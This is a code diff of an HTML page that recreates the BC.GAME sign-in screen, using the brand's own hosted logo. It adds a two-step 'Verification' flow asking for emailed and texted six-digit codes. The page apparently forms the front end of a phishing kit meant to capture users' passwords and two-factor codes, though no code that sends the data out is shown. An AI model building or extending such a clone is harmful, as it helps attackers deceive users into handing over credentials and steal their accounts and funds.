@@ -9,121 +9,124 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
-    <div class="app-container" id="sign-in-screen">
-        <div class="login-modal">
-            <header class="header">
-                <img src="logo.png" onerror="this.src='https://bc.game/assets/logo.01f4640d.png'" alt="BC.GAME" class="logo">
-                <button class="btn-close"><i class="fas fa-times"></i></button>
+    <!-- Sign In Screen -->
+    <div class="app-container" id="screen-signin">
+        <div class="modal-box">
+            <header class="signin-header">
+                <img src="logo.png" onerror="this.src='https://bc.game/assets/logo.01f4640d.png'" alt="BC.GAME" class="bc-logo">
+                <button class="btn-icon-close"><i class="fas fa-times"></i></button>
             </header>
 
-            <main class="content">
-                <h2 class="title">Sign In</h2>
+            <main class="signin-content">
+                <h2 class="signin-title">Sign In</h2>
 
-                <div class="tabs">
-                    <button class="tab active" data-tab="password">
+                <div class="signin-tabs">
+                    <button class="signin-tab active" data-tab="password">
                         <i class="fas fa-lock"></i> Password
                     </button>
-                    <button class="tab" data-tab="otp">
+                    <button class="signin-tab" data-tab="otp">
                         <i class="fas fa-mobile-alt"></i> One-time Code
                     </button>
                 </div>
 
-                <div class="form-group">
-                    <input type="text" id="identifier" placeholder="Email / Phone Number / Username" autocomplete="username">
+                <div class="input-field-wrapper">
+                    <input type="text" id="login-identifier" placeholder="Email / Phone Number / Username">
                 </div>
 
-                <div class="form-group" id="password-wrapper">
-                    <input type="password" id="password" placeholder="Password" autocomplete="current-password">
-                    <button class="btn-toggle-password"><i class="far fa-eye"></i></button>
+                <div class="input-field-wrapper" id="login-password-wrapper">
+                    <input type="password" id="login-password" placeholder="Password">
+                    <button class="btn-password-eye"><i class="far fa-eye"></i></button>
                 </div>
 
-                <div class="forgot-password">
+                <div class="forgot-link">
                     <a href="#">Forgot your password?</a>
                 </div>
 
-                <button class="btn-signin" id="btn-signin">Sign In</button>
+                <button class="btn-primary-main" id="trigger-signin">Sign In</button>
 
-                <div class="register-link">
-                    New to BC.GAME? <span class="accent-text">Create account</span>
+                <div class="register-text">
+                    New to BC.GAME? <span>Create account</span>
                 </div>
 
-                <div class="divider">
+                <div class="divider-box">
                     <span>Log in directly with</span>
                 </div>
 
-                <button class="btn-passkey">
+                <button class="btn-passkey-alt">
                     <i class="fas fa-user-shield"></i> Sign In with passkey
                 </button>
 
-                <div class="social-login">
-                    <div class="social-item"><i class="fab fa-google"></i></div>
-                    <div class="social-item"><i class="fab fa-facebook-f"></i></div>
-                    <div class="social-item"><i class="fab fa-telegram-plane"></i></div>
-                    <div class="social-item"><i class="fab fa-apple"></i></div>
-                    <div class="social-item"><i class="fab fa-whatsapp"></i></div>
-                    <div class="social-item"><i class="fab fa-line"></i></div>
-                    <div class="social-item"><i class="fab fa-steam"></i></div>
+                <div class="social-grid">
+                    <div class="social-circle"><i class="fab fa-google"></i></div>
+                    <div class="social-circle"><i class="fab fa-x-twitter"></i></div>
+                    <div class="social-circle"><i class="fab fa-telegram-plane"></i></div>
+                    <div class="social-circle"><i class="fab fa-apple"></i></div>
+                    <div class="social-circle"><i class="fab fa-whatsapp"></i></div>
+                    <div class="social-circle"><i class="fab fa-line"></i></div>
+                    <div class="social-circle"><i class="fab fa-steam"></i></div>
                 </div>
             </main>
         </div>
     </div>
 
-    <!-- Step 1: Selection Screen -->
-    <div class="modal-overlay" id="verification-step-modal">
-        <div class="modal-verify verification-step">
-            <header class="step-header">
-                <button class="btn-back"><i class="fas fa-chevron-left"></i></button>
-                <h3 class="step-title">Verification</h3>
-                <div style="width: 32px;"></div>
+    <!-- Verification Step Screen (1/2) -->
+    <div class="overlay-full" id="screen-stepper">
+        <div class="modal-box" style="width: 100%; max-width: 420px;">
+            <header class="step-header-bar">
+                <button class="btn-step-back" id="back-to-signin"><i class="fas fa-chevron-left"></i></button>
+                <span class="step-bar-title">Verification</span>
+                <div style="width: 36px;"></div>
             </header>
 
-            <div class="step-content">
-                <p class="step-info">For your account safety, please complete all of the following verifications to continue.</p>
+            <main class="step-main-content">
+                <p class="step-instruction">For your account safety, please complete all of the following verifications to continue.</p>
                 
-                <h1 class="step-count" id="step-count-text">1/2</h1>
+                <h1 class="step-big-number" id="step-number-display">1/2</h1>
 
-                <div class="verify-item active" id="email-verify-item">
-                    <div class="item-icon"><i class="fas fa-shield-alt"></i></div>
-                    <div class="item-text">Email Verification</div>
-                    <div class="item-action">Go Verify <i class="fas fa-chevron-right"></i></div>
+                <div class="verification-card active" id="item-email">
+                    <div class="card-icon-box"><i class="fas fa-shield-alt"></i></div>
+                    <div class="card-label">Email Verification</div>
+                    <div class="card-link" id="link-email-verify">Go Verify <i class="fas fa-chevron-right"></i></div>
                 </div>
 
-                <div class="verify-item disabled" id="phone-verify-item">
-                    <div class="item-icon"><i class="fas fa-phone-alt"></i></div>
-                    <div class="item-text">Phone Verification</div>
-                    <div class="item-action">Go Verify <i class="fas fa-chevron-right"></i></div>
+                <div class="verification-card" id="item-phone" style="opacity: 0.5; pointer-events: none;">
+                    <div class="card-icon-box"><i class="fas fa-phone-alt"></i></div>
+                    <div class="card-label">Phone Verification</div>
+                    <div class="card-link" id="link-phone-verify">Go Verify <i class="fas fa-chevron-right"></i></div>
                 </div>
 
-                <button class="btn-confirm-step" disabled>Confirm</button>
+                <button class="btn-step-confirm" id="btn-final-confirm">Confirm</button>
 
-                <p class="step-support">Don't have access to these verification methods?<br><span class="accent-text">Contact live support</span></p>
-            </div>
+                <p class="support-footer">Don't have access to these verification methods?<br><span class="accent-text">Contact live support</span></p>
+            </main>
         </div>
     </div>
 
-    <!-- OTP Modal (Generic for both) -->
-    <div class="modal-overlay" id="otp-modal">
-        <div class="modal-verify">
-            <button class="modal-close"><i class="fas fa-times"></i></button>
+    <!-- OTP Input Modal -->
+    <div class="overlay-full" id="screen-otp">
+        <div class="otp-modal-box">
+            <button class="btn-icon-close" style="position: absolute; right: 16px; top: 16px;" id="close-otp-modal"><i class="fas fa-times"></i></button>
             
-            <div class="verify-icon">
-                <i class="fas fa-envelope" id="verify-icon-type"></i>
+            <div class="otp-icon-circle">
+                <i class="fas fa-envelope" id="otp-type-icon"></i>
             </div>
 
-            <h3 class="verify-title" id="verify-title-text">Email Verification</h3>
-            <p class="verify-text" id="verify-desc-text">Please enter the 6-digit verification code sent on e-mail</p>
+            <h3 class="otp-title-text" id="otp-title-display">Email Verification</h3>
+            <p class="otp-subtitle-text" id="otp-desc-display">Please enter the 6-digit verification code sent on e-mail</p>
 
-            <div class="input-label">Verification Code</div>
-            <div class="verify-input-group">
-                <input type="text" id="otp-input" placeholder="6-digit verification code">
-                <button class="btn-paste">Paste</button>
+            <div class="input-field-wrapper" style="margin-top: 24px;">
+                <div style="text-align: left; color: var(--text-gray); font-size: 14px; margin-bottom: 8px;">Verification Code</div>
+                <div class="otp-input-group">
+                    <input type="text" id="otp-input-field" placeholder="Verification code" maxlength="6">
+                    <button class="otp-btn-paste">Paste</button>
+                </div>
             </div>
 
-            <div class="timer">
-                Resend in <span id="timer-count">60</span>s
+            <div class="otp-timer-box">
+                Resend in <span id="otp-seconds">60</span>s
             </div>
 
-            <button class="btn-confirm" id="btn-confirm-otp">Confirm</button>
+            <button class="btn-confirm-final" id="btn-otp-submit">Confirm</button>
         </div>
     </div>
 
